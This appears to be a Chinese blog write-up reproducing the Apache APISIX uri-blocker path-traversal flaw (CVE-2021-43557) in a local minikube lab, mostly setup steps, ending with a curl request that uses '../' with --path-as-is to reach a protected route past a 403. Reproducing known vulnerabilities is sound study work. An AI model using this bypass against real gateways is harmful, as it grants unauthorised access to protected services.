前言

如果在 ApiSix 中使用错误的方法实现 request_uri 变量，则会触发Apache ApiSix Request Uri目录穿越漏洞（CVE-2021-43557）。


为什么选择研究这个变量？因为这个变量虽然用于认证，但是对于它的使用没有任何官方规范，所以有些插件实现的过程中可能出现漏洞。uri-blocker就是作者发现的其中一个可能会引发此漏洞的组件。


复现环境

Ubuntu 18.04APISIX 2.10.0

P.S. 一定不要以root身份运行minikube，会导致拉起docker失败


安装 Docker

参考

http://lovebear.top/2020/04/07/Kubernetes_And_Docker_Install/

中安装 Docker的部分


安装 minikube

1. 安装 kubectl

curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl
chmod +x ./kubectl && sudo mv ./kubectl /usr/local/bin/kubectl


2. 安装 virtualbox

sudo apt install virtualbox virtualbox-ext-pack


3. 安装 minikube

curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \  && chmod +x minikube
sudo mkdir -p /usr/local/bin/sudo install minikube /usr/local/bin/


4. 启动


当前用户添加docker组

sudo usermod -aG docker $USER && newgrp docker
minikube start --driver=docker


P.S. 如果报错 machine does not exist，执行

minikube delete


清理本地状态后再start，可以看到status都是running，证明没问题

kubectl get pods --all-namespaces


安装 helm

wget https://get.helm.sh/helm-v3.3.4-linux-amd64.tar.gztar zxvf helm-v3.3.4-linux-amd64.tar.gzmv linux-amd64/helm /usr/local/bin/helm


helm version


安装 ApiSix

helm repo add apisix https://charts.apiseven.comhelm repo add bitnami https://charts.bitnami.com/bitnamihelm repo updatekubectl create ns ingress-apisixhelm install apisix apisix/apisix \  --set gateway.type=NodePort \  --set ingress-controller.enabled=true \  --namespace ingress-apisix \  --version 0.7.2kubectl get service --namespace ingress-apisix


查看pod状态

kubectl get pods --all-namespaces


都是running就可以了（需要耐心等待一段时间，不要着急）


如果没起来，可以看报错，解决方案自查

journalctl -f -u kubelet

部署应用

1. 下载Poc

https://github.com/xvnpw/k8s-CVE-2021-43557-poc


2. 部署

kubectl apply -f app.yamlkubectl apply -f routes.yaml


复现

P.S. poc中的namespace和pod name根据自己的环境修改掉


1. 访问public页面，200

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-2577p -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'


2. 访问protect页面，403

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-2577p -- curl --path-as-is http://127.0.0.1:9080/protected-service/protected -H 'Host: app.test'


3. 绕过403访问protect页面

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-2577p -- curl --path-as-is http://127.0.0.1:9080/public-service/../protected-service/protected -H 'Host: app.test'


成功绕过！
